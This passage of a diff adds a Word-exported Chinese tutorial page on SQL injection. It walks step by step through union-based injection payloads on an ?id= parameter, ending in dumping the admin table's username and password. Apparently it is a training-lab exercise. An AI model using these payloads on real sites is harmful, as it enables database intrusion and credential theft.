+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=1 order by 1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_9" o:spid="_x0000_i1037"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/95b05aad13acc48dfbc84e53ed638ab4.png"
+ style='width:415.5pt;height:286.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image014.png" o:title="95b05aad13acc48dfbc84e53ed638ab4"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=382
+src="SQL注入攻击原理%20实战演练.files/image015.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/95b05aad13acc48dfbc84e53ed638ab4.png"
+v:shapes="图片_x0020_9"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>页面正常</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=1 order by 2 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_10" o:spid="_x0000_i1036"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/0df7156e224627f9a5f80d36fbf4de5d.png"
+ style='width:415.5pt;height:288.75pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image016.png" o:title="0df7156e224627f9a5f80d36fbf4de5d"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=385
+src="SQL注入攻击原理%20实战演练.files/image017.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/0df7156e224627f9a5f80d36fbf4de5d.png"
+v:shapes="图片_x0020_10"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>页面正常</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=1 order by 3 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_11" o:spid="_x0000_i1035"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/f207ffda2481317c1ccad610eadaa7e5.png"
+ style='width:415.5pt;height:4in;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image018.png" o:title="f207ffda2481317c1ccad610eadaa7e5"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=384
+src="SQL注入攻击原理%20实战演练.files/image019.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/f207ffda2481317c1ccad610eadaa7e5.png"
+v:shapes="图片_x0020_11"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>页面返回 错误，判断字段数为<span lang=EN-US> 2</span></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text><b><span style='font-size:18.0pt;color:#393939'>第三步：判断回显点</span></b></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select 1,2 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_12" o:spid="_x0000_i1034"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/2e5c5824c7c2abd11571bef986f6dabe.png"
+ style='width:415.5pt;height:278.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image020.png" o:title="2e5c5824c7c2abd11571bef986f6dabe"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=371
+src="SQL注入攻击原理%20实战演练.files/image021.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/2e5c5824c7c2abd11571bef986f6dabe.png"
+v:shapes="图片_x0020_12"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>页面出现了<span lang=EN-US> 2 </span>，说明我们可以在数字<span
+lang=EN-US> 2 </span>处显示我们想要的内容</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text><b><span style='font-size:18.0pt;color:#393939'>第四步<span
+lang=EN-US>:</span>查询相关内容</span></b></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>查询当前数据库名</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,database() </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_13" o:spid="_x0000_i1033"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/46d935412382cf748605ead31d519440.png"
+ style='width:415.5pt;height:261pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image022.png" o:title="46d935412382cf748605ead31d519440"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=348
+src="SQL注入攻击原理%20实战演练.files/image023.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/46d935412382cf748605ead31d519440.png"
+v:shapes="图片_x0020_13"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>查询当前数据库版本</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,version() </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_14" o:spid="_x0000_i1032"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/dcffa01ce32d5544aa3af08a6ab597c6.png"
+ style='width:415.5pt;height:266.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image024.png" o:title="dcffa01ce32d5544aa3af08a6ab597c6"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=355
+src="SQL注入攻击原理%20实战演练.files/image025.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/dcffa01ce32d5544aa3af08a6ab597c6.png"
+v:shapes="图片_x0020_14"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>查询当前数据库 表名</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,table_name from <span class=SpellE>information_schema.tables</span> where <span
+class=SpellE>table_schema</span>=database() limit 0,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_15" o:spid="_x0000_i1031"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/ad3e67184d3fc69e17bb2cf236bc82dc.png"
+ style='width:414.75pt;height:234pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image026.png" o:title="ad3e67184d3fc69e17bb2cf236bc82dc"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=553 height=312
+src="SQL注入攻击原理%20实战演练.files/image027.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/ad3e67184d3fc69e17bb2cf236bc82dc.png"
+v:shapes="图片_x0020_15"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>绝大数情况下，管理员的账号密码都在<span lang=EN-US>admin</span>表里</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>查询字段名</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,column_name from <span class=SpellE>information_schema.columns</span> where <span
+class=SpellE>table_schema</span>=database() and <span class=SpellE>table_name</span>='admin'
+limit 0,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_16" o:spid="_x0000_i1030"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/727912aee432793581fdc525eea5b7d3.png"
+ style='width:415.5pt;height:261pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image028.png" o:title="727912aee432793581fdc525eea5b7d3"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=348
+src="SQL注入攻击原理%20实战演练.files/image029.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/727912aee432793581fdc525eea5b7d3.png"
+v:shapes="图片_x0020_16"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,column_name from <span class=SpellE>information_schema.columns</span> where <span
+class=SpellE>table_schema</span>=database() and <span class=SpellE>table_name</span>='admin'
+limit 1,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_17" o:spid="_x0000_i1029"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/0e5e6f0b079395f54f066b62e370fd3c.png"
+ style='width:415.5pt;height:246.75pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image030.png" o:title="0e5e6f0b079395f54f066b62e370fd3c"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=329
+src="SQL注入攻击原理%20实战演练.files/image031.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/0e5e6f0b079395f54f066b62e370fd3c.png"
+v:shapes="图片_x0020_17"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select 1,column_name
+from <span class=SpellE>information_schema.columns</span> where <span
+class=SpellE>table_schema</span>=database() and <span class=SpellE>table_name</span>='admin'
+limit 2,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_18" o:spid="_x0000_i1028"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/63c5e360490e6cd7472521cbc5344ea8.png"
+ style='width:414.75pt;height:270.75pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image032.png" o:title="63c5e360490e6cd7472521cbc5344ea8"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=553 height=361
+src="SQL注入攻击原理%20实战演练.files/image033.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/63c5e360490e6cd7472521cbc5344ea8.png"
+v:shapes="图片_x0020_18"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>查出<span lang=EN-US> admin </span>表里 有<span
+lang=EN-US> id username password </span>三个字段</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>查询字段内容</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,username from admin limit 0,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_19" o:spid="_x0000_i1027"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/b45958e4625296047936bcc418dc3689.png"
+ style='width:414.75pt;height:276pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image034.png" o:title="b45958e4625296047936bcc418dc3689"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=553 height=368
+src="SQL注入攻击原理%20实战演练.files/image035.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/b45958e4625296047936bcc418dc3689.png"
+v:shapes="图片_x0020_19"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select 1,password
+from admin limit 1,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_20" o:spid="_x0000_i1026"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/93ea6cfe14260553ec81f2bb783f01ae.png"
+ style='width:415.5pt;height:261pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image036.png" o:title="93ea6cfe14260553ec81f2bb783f01ae"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=348
+src="SQL注入攻击原理%20实战演练.files/image037.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/93ea6cfe14260553ec81f2bb783f01ae.png"
+v:shapes="图片_x0020_20"><![endif]></span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text><span lang=EN-US>limit 1,1 </span>没有回显，说明只有一个用户</span></p>
+
+<p class=ne-p align=center style='margin:0cm;margin-bottom:.0001pt;text-align:
+center'><span class=ne-text>构造<span lang=EN-US> ?id=1 and 1=2 union select
+1,password from admin limit 0,1 </span>回车</span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US
+style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="图片_x0020_21" o:spid="_x0000_i1025"
+ type="#_x0000_t75" alt="https://bbs.zkaq.cn/upload/userfile/814/0b3a07dd50aa608a6475cf9501342162.png"
+ style='width:415.5pt;height:272.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="SQL注入攻击原理%20实战演练.files/image038.png" o:title="0b3a07dd50aa608a6475cf9501342162"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=554 height=363
+src="SQL注入攻击原理%20实战演练.files/image039.png"
+alt="https://bbs.zkaq.cn/upload/userfile/814/0b3a07dd50aa608a6475cf9501342162.png"
+v:shapes="图片_x0020_21"><![endif]></span></p>
+
+<p class=MsoNormal align=center style='text-align:center;mso-pagination:widow-orphan'><span
+style='font-size:12.0pt;font-family:宋体;mso-bidi-font-family:宋体;mso-font-kerning:
+0pt'>得到管理员账号和密码<span lang=EN-US><o:p></o:p></span></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span lang=EN-US><o:p>&nbsp;</o:p></span></p>
+
+</div>
+
+</body>
+
+</html>
